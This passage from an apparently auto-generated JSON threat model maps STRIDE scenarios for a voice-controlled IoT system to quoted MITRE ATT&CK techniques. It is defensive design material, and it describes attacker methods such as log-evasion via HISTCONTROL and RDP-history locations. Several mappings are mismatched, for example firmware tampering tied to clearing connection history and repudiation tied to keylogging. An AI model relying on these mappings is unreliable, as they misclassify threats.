                    "Condition": "Physical presence near the device."
                }
            ],
            "Potential Impact": "Unauthorized access to IoT devices resulting in potential misuse or abuse.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "voice",
                "impersonation",
                "IoT"
            ],
            "mitre_technique": {
                "name": "Spearphishing Voice",
                "description": "Adversaries may use voice communications to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: [Impersonation](https://attack.mitre.org/techniques/T1656)) and/or creating a sense of urgency or alarm for the recipient.\n\nAll forms of phishing are electronically delivered social engineering. In this scenario, adversaries use phone calls to elicit sensitive information from victims. Known as voice phishing (or \"vishing\"), these communications can be manually executed by adversaries, hired call centers, or even automated via robocalls. Voice phishers may spoof their phone number while also posing as a trusted entity, such as a business partner or technical support staff.(Citation: BOA Telephone Scams)\n\nVictims may also receive phishing messages that direct them to call a phone number (\"callback phishing\") where the adversary attempts to collect confidential information.(Citation: Avertium callback phishing)\n\nAdversaries may also use information from previous reconnaissance efforts (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)) to tailor pretexts to be even more persuasive and believable for the victim.",
                "id": "attack-pattern--6a5d222a-a7e0-4656-b110-782c33098289",
                "technique_id": "T1598.004"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker impersonates the legitimate server to intercept and alter commands.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can perform man-in-the-middle attacks.",
                    "Role": "Attacker",
                    "Condition": "Network susceptible to MITM attacks."
                },
                {
                    "Assumption": "The system does not use secure communication channels (e.g., TLS).",
                    "Role": "System",
                    "Condition": "Unsecured communication protocols."
                },
                {
                    "Assumption": "The user accepts the altered commands without verification.",
                    "Role": "User",
                    "Condition": "No user verification or awareness."
                }
            ],
            "Potential Impact": "Interception and modification of commands leading to incorrect operations of IoT devices.",
            "MITRE ATT&CK Keywords": [
                "MITM",
                "interception",
                "IoT",
                "network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker creates a fake client-side application to collect sensitive data from users.",
            "Assumptions": [
                {
                    "Assumption": "The attacker is able to distribute the fake application.",
                    "Role": "Attacker",
                    "Condition": "Distribution channels compromised or trusted."
                },
                {
                    "Assumption": "Users download and install the fake application.",
                    "Role": "User",
                    "Condition": "Lack of app verification by users."
                },
                {
                    "Assumption": "Users provide sensitive voice commands to the fake application.",
                    "Role": "User",
                    "Condition": "User trust in the fake application."
                }
            ],
            "Potential Impact": "Collection of sensitive user data leading to privacy breaches.",
            "MITRE ATT&CK Keywords": [
                "app",
                "spoofing",
                "sensitive data",
                "IoT"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker manipulates firmware updates for IoT devices.",
            "Assumptions": [
                {
                    "Assumption": "Firmware updates are not validated before installation.",
                    "Role": "System",
                    "Condition": "Lack of validation mechanisms."
                },
                {
                    "Assumption": "The attacker has access to the firmware update process.",
                    "Role": "Attacker",
                    "Condition": "Access via compromised network or device."
                },
                {
                    "Assumption": "The manipulated firmware is accepted and installed.",
                    "Role": "User",
                    "Condition": "Absence of user verification steps."
                }
            ],
            "Potential Impact": "IoT device compromise leading to unexpected behavior or backdoors.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "firmware",
                "IoT",
                "update"
            ],
            "mitre_technique": {
                "name": "Clear Network Connection History and Configurations",
                "description": "Adversaries may clear or remove evidence of malicious network connections in order to clean up traces of their operations. Configuration settings as well as various artifacts that highlight connection history may be created on a system and/or in application logs from behaviors that require network connections, such as [Remote Services](https://attack.mitre.org/techniques/T1021) or [External Remote Services](https://attack.mitre.org/techniques/T1133). Defenders may use these artifacts to monitor or otherwise analyze network connections created by adversaries.\n\nNetwork connection history may be stored in various locations. For example, RDP connection history may be stored in Windows Registry values under (Citation: Microsoft RDP Removal):\n\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Servers</code>\n\nWindows may also store information about recent RDP connections in files such as <code>C:\\Users\\\\%username%\\Documents\\Default.rdp</code> and `C:\\Users\\%username%\\AppData\\Local\\Microsoft\\Terminal\nServer Client\\Cache\\`.(Citation: Moran RDPieces) Similarly, macOS and Linux hosts may store information highlighting connection history in system logs (such as those stored in `/Library/Logs` and/or `/var/log/`).(Citation: Apple Culprit Access)(Citation: FreeDesktop Journal)(Citation: Apple Unified Log Analysis Remote Login and Screen Sharing)\n\nMalicious network connections may also require changes to third-party applications or network configuration settings, such as [Disable or Modify System Firewall](https://attack.mitre.org/techniques/T1562/004) or tampering to enable [Proxy](https://attack.mitre.org/techniques/T1090). Adversaries may delete or modify this data to conceal indicators and/or impede defensive analysis.",
                "id": "attack-pattern--3975dbb5-0e1e-4f5b-bae1-cf2ab84b46dc",
                "technique_id": "T1070.007"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker alters the communication between the client-side application and the server-side application.",
            "Assumptions": [
                {
                    "Assumption": "The communication channel is not encrypted.",
                    "Role": "System",
                    "Condition": "Absence of encryption."
                },
                {
                    "Assumption": "The attacker can intercept and alter messages.",
                    "Role": "Attacker",
                    "Condition": "Network access for MITM attacks."
                },
                {
                    "Assumption": "The client and server do not verify message integrity.",
                    "Role": "System",
                    "Condition": "Lack of integrity checks."
                }
            ],
            "Potential Impact": "Miscommunication leading to incorrect actions or data corruption.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "network",
                "communication",
                "interception"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies stored data in the cloud services.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has access to cloud storage.",
                    "Role": "Attacker",
                    "Condition": "Compromised cloud account or credentials."
                },
                {
                    "Assumption": "The cloud storage does not have adequate security controls.",
                    "Role": "System",
                    "Condition": "Weak or missing security measures."
                },
                {
                    "Assumption": "Modified data is accepted by the system without validation.",
                    "Role": "System",
                    "Condition": "No data integrity checks."
                }
            ],
            "Potential Impact": "Corruption of sensitive data leading to operational disruptions.",
            "MITRE ATT&CK Keywords": [
                "data",
                "tampering",
                "cloud",
                "storage"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92",
                "technique_id": "T1492"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies sending specific voice commands that led to unauthorized actions.",
            "Assumptions": [
                {
                    "Assumption": "The system lacks comprehensive logging.",
                    "Role": "System",
                    "Condition": "Insufficient or missing logs."
                },
                {
                    "Assumption": "Command execution traceability is not enforced.",
                    "Role": "System",
                    "Condition": "Lack of traceability mechanisms."
                },
                {
                    "Assumption": "Voice commands are not uniquely identifiable.",
                    "Role": "System",
                    "Condition": "Absence of command identification."
                }
            ],
            "Potential Impact": "Disputes on performed actions leading to accountability issues.",
            "MITRE ATT&CK Keywords": [
                "voice",
                "repudiation",
                "command",
                "logging"
            ],
            "mitre_technique": {
                "name": "HISTCONTROL",
                "description": "The <code>HISTCONTROL</code> environment variable keeps track of what should be saved by the <code>history</code> command and eventually into the <code>~/.bash_history</code> file when a user logs out. This setting can be configured to ignore commands that start with a space by simply setting it to \"ignorespace\". <code>HISTCONTROL</code> can also be set to ignore duplicate commands by setting it to \"ignoredups\". In some Linux systems, this is set by default to \"ignoreboth\" which covers both of the previous examples. This means that \u201c ls\u201d will not be saved, but \u201cls\u201d would be saved by history. <code>HISTCONTROL</code> does not exist by default on macOS, but can be set by the user and will be respected. Adversaries can use this to operate without leaving traces by simply prepending a space to all of their terminal commands.",
                "id": "attack-pattern--086952c4-5b90-4185-b573-02bad8e11953",
                "technique_id": "T1148"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An administrator denies making configuration changes that altered system operations.",
            "Assumptions": [
                {
                    "Assumption": "System changes are not appropriately logged.",
                    "Role": "System",
                    "Condition": "Weak logging practices."
                },
                {
                    "Assumption": "Access controls do not record actions per user.",
                    "Role": "System",
                    "Condition": "Lack of user-specific logs."
                },
                {
                    "Assumption": "System lacks tamper-proof audit logs.",
                    "Role": "System",
                    "Condition": "Logs can be altered or deleted."
                }
            ],
            "Potential Impact": "Difficulty in tracing changes to specific actors leading to undetected malicious behavior.",
            "MITRE ATT&CK Keywords": [
                "configuration",
                "repudiation",
                "logging",
                "admin"
            ],
            "mitre_technique": {
                "name": "Data from Configuration Repository",
                "description": "Adversaries may collect data related to managed devices from configuration repositories. Configuration repositories are used by management systems in order to configure, manage, and control data on remote systems. Configuration repositories may also facilitate remote access and administration of devices.\n\nAdversaries may target these repositories in order to collect large quantities of sensitive system administration data. Data from configuration repositories may be exposed by various protocols and software and can store a wide variety of data, much of which may align with adversary Discovery objectives.(Citation: US-CERT-TA18-106A)(Citation: US-CERT TA17-156A SNMP Abuse 2017)",
                "id": "attack-pattern--0ad7bc5c-235a-4048-944b-3b286676cb74",
                "technique_id": "T1602"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker performs actions on IoT devices and denies involvement.",
            "Assumptions": [
                {
                    "Assumption": "IoT device actions are not logged with user attribution.",
                    "Role": "System",
                    "Condition": "Lack of user-action logs."
                },
                {
                    "Assumption": "Authentication mechanisms are weak or bypassed.",
                    "Role": "System",
                    "Condition": "Weak authentication."
                },
                {
                    "Assumption": "System does not verify the origin of control requests.",
                    "Role": "System",
                    "Condition": "No request origin validation."
                }
            ],
            "Potential Impact": "Unaccountable actions leading to misuse of IoT devices.",
            "MITRE ATT&CK Keywords": [
                "IoT",
                "repudiation",
                "action",
                "logging"
            ],
            "mitre_technique": {
                "name": "Keylogging",
                "description": "Adversaries may log user keystrokes to intercept credentials as the user types them. Keylogging is likely to be used to acquire credentials for new access opportunities when [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) efforts are not effective, and may require an adversary to intercept keystrokes on a system for a substantial period of time before credentials can be successfully captured. In order to increase the likelihood of capturing credentials quickly, an adversary may also perform actions such as clearing browser cookies to force users to reauthenticate to systems.(Citation: Talos Kimsuky Nov 2021)\n\nKeylogging is the most prevalent type of input capture, with many different ways of intercepting keystrokes.(Citation: Adventures of a Keystroke) Some methods include:\n\n* Hooking API callbacks used for processing keystrokes. Unlike [Credential API Hooking](https://attack.mitre.org/techniques/T1056/004), this focuses solely on API functions intended for processing keystroke data.\n* Reading raw keystroke data from the hardware buffer.\n* Windows Registry modifications.\n* Custom drivers.\n* [Modify System Image](https://attack.mitre.org/techniques/T1601) may provide adversaries with hooks into the operating system of network devices to read raw keystrokes for login sessions.(Citation: Cisco Blog Legacy Device Attacks) ",
                "id": "attack-pattern--09a60ea3-a8d1-4ae5-976e-5783248b72a4",
                "technique_id": "T1056.001"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker intercepts unencrypted voice commands and responses.",
            "Assumptions": [
                {
                    "Assumption": "Communication is not encrypted end-to-end.",
                    "Role": "System",
                    "Condition": "Absence of encryption protocols."
                },
                {
                    "Assumption": "The attacker has access to the network traffic.",
                    "Role": "Attacker",
                    "Condition": "Network interception capability."
                },
                {
                    "Assumption": "Voice data is sensitive and valuable to the attacker.",
                    "Role": "System",
                    "Condition": "Sensitive information conveyed via voice."
                }
            ],
            "Potential Impact": "Eavesdropping leading to privacy breaches and unauthorized access to sensitive information.",
            "MITRE ATT&CK Keywords": [
                "interception",
                "voice",
                "communication",
                "network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive data stored in cloud services is accessed by unauthorized actors.",
            "Assumptions": [
                {
                    "Assumption": "Cloud storage is improperly configured.",
                    "Role": "System",
                    "Condition": "Misconfigured cloud settings."
                },
                {
                    "Assumption": "Attackers obtain access credentials.",
                    "Role": "Attacker",
                    "Condition": "Compromised credentials."
                },
                {
                    "Assumption": "Sensitive data is stored without encryption.",
                    "Role": "System",
                    "Condition": "Unencrypted data storage."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive information.",
            "MITRE ATT&CK Keywords": [
                "cloud",
                "data",
                "access",
                "disclosure"
            ],
            "mitre_technique": {
                "name": "Serverless",
                "description": "Adversaries may purchase and configure serverless cloud infrastructure, such as Cloudflare Workers or AWS Lambda functions, that can be used during targeting. By utilizing serverless infrastructure, adversaries can make it more difficult to attribute infrastructure used during operations back to them.\n\nOnce acquired, the serverless runtime environment can be leveraged to either respond directly to infected machines or to [Proxy](https://attack.mitre.org/techniques/T1090) traffic to an adversary-owned command and control server.(Citation: BlackWater Malware Cloudflare Workers)(Citation: AWS Lambda Redirector) As traffic generated by these functions will appear to come from subdomains of common cloud providers, it may be difficult to distinguish from ordinary traffic to these providers.(Citation: Detecting Command & Control in the Cloud)(Citation: BlackWater Malware Cloudflare Workers)",
                "id": "attack-pattern--04a5a8ab-3bc8-4c83-95c9-55274a89786d",
                "technique_id": "T1583.007"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An IoT device transmits data over an insecure channel, exposing it to potential interception.",
            "Assumptions": [
                {
                    "Assumption": "Transmitted data is not encrypted.",
                    "Role": "System",
                    "Condition": "Lack of encryption."
                },
                {
                    "Assumption": "Attackers can intercept the communication.",
                    "Role": "Attacker",
                    "Condition": "Interception capability."
                },
                {
                    "Assumption": "IoT devices send sensitive information over the network.",
                    "Role": "System",
                    "Condition": "Sensitive data transmission."
                }
            ],
            "Potential Impact": "Interception and potential misuse of sensitive information.",
            "MITRE ATT&CK Keywords": [
                "IoT",
                "transmission",
                "interception",
                "insecure"
            ],
            "mitre_technique": {
                "name": "Network Sniffing",
                "description": "Adversaries may passively sniff network traffic to capture information about an environment, including authentication material passed over the network. Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection. An adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data.\n\nData captured via this technique may include user credentials, especially those sent over an insecure, unencrypted protocol. Techniques for name service resolution poisoning, such as [LLMNR/NBT-NS Poisoning and SMB Relay](https://attack.mitre.org/techniques/T1557/001), can also be used to capture credentials to websites, proxies, and internal systems by redirecting traffic to an adversary.\n\nNetwork sniffing may reveal configuration details, such as running services, version numbers, and other network characteristics (e.g. IP addresses, hostnames, VLAN IDs) necessary for subsequent [Lateral Movement](https://attack.mitre.org/tactics/TA0008) and/or [Defense Evasion](https://attack.mitre.org/tactics/TA0005) activities. Adversaries may likely also utilize network sniffing during [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) (AiTM) to passively gain additional knowledge about the environment.\n\nIn cloud-based environments, adversaries may still be able to use traffic mirroring services to sniff network traffic from virtual machines. For example, AWS Traffic Mirroring, GCP Packet Mirroring, and Azure vTap allow users to define specified instances to collect traffic from and specified targets to send collected traffic to.(Citation: AWS Traffic Mirroring)(Citation: GCP Packet Mirroring)(Citation: Azure Virtual Network TAP) Often, much of this traffic will be in cleartext due to the use of TLS termination at the load balancer level to reduce the strain of encrypting and decrypting traffic.(Citation: Rhino Security Labs AWS VPC Traffic Mirroring)(Citation: SpecterOps AWS Traffic Mirroring) The adversary can then use exfiltration techniques such as Transfer Data to Cloud Account in order to access the sniffed traffic.(Citation: Rhino Security Labs AWS VPC Traffic Mirroring)\n\nOn network devices, adversaries may perform network captures using [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `monitor capture`.(Citation: US-CERT-TA18-106A)(Citation: capture_embedded_packet_on_software)",
                "id": "attack-pattern--3257eb21-f9a7-4430-8de1-d8b6e288f529",
                "technique_id": "T1040"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker floods the server with excessive voice commands, causing a service outage.",
            "Assumptions": [
                {
                    "Assumption": "The system lacks rate limiting mechanisms.",
                    "Role": "System",
                    "Condition": "No rate limiting implemented."
                },
                {
                    "Assumption": "The attacker has the capability to send a large volume of requests.",
                    "Role": "Attacker",
                    "Condition": "Sufficient resources for attack."
                },
                {
                    "Assumption": "The server is not resilient to high traffic loads.",
                    "Role": "System",
                    "Condition": "Insufficient scalability."
                }
            ],
            "Potential Impact": "Service disruption and unavailability for legitimate users.",
            "MITRE ATT&CK Keywords": [
                "DoS",
                "voice",
                "flooding",
                "server"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker compromises multiple IoT devices to form a botnet and launch a coordinated attack against the server.",
            "Assumptions": [
                {
                    "Assumption": "IoT devices are vulnerable to compromise.",
                    "Role": "System",
                    "Condition": "Unpatched vulnerabilities."
                },
                {
                    "Assumption": "The attacker has control over the compromised devices.",
                    "Role": "Attacker",
                    "Condition": "Control established."
                },
                {
                    "Assumption": "The server cannot handle the load from a coordinated botnet attack.",
                    "Role": "System",
                    "Condition": "Limited defense capabilities."
                }
            ],
            "Potential Impact": "Distributed denial of service resulting in extensive service outages.",
            "MITRE ATT&CK Keywords": [
                "botnet",
                "IoT",
                "DDoS",
                "server"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker targets the cloud services hosting the application, causing downtime.",
            "Assumptions": [
                {
                    "Assumption": "Cloud services are not adequately protected.",
                    "Role": "System",
                    "Condition": "Weak cloud security."
                },
                {
                    "Assumption": "The attacker can identify and target the cloud service infrastructure.",
                    "Role": "Attacker",
                    "Condition": "Service specifics known."
                },
                {
                    "Assumption": "Cloud services are central to the application\u2019s operation.",
                    "Role": "System",
                    "Condition": "Critical cloud dependency."
                }
            ],
            "Potential Impact": "Extended downtime affecting user interactions and IoT device management.",
            "MITRE ATT&CK Keywords": [
                "cloud",
                "DoS",
                "service",
                "downtime"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker gains administrative access to IoT devices by exploiting vulnerabilities.",
            "Assumptions": [
                {
                    "Assumption": "IoT devices have unpatched vulnerabilities.",
                    "Role": "System",
                    "Condition": "Outdated firmware or software."
                },
                {
                    "Assumption": "Attackers can exploit these vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "Exploitation tools available."
                },
                {
                    "Assumption": "Admin access grants full control over device functions.",
                    "Role": "System",
                    "Condition": "No restrictive measures."
                }
            ],
            "Potential Impact": "Full control over IoT devices leading to potential misuse or sabotage.",
            "MITRE ATT&CK Keywords": [
                "IoT",
                "vulnerability",
                "admin",
                "exploit"
            ],
            "mitre_technique": {
                "name": "LSA Secrets",
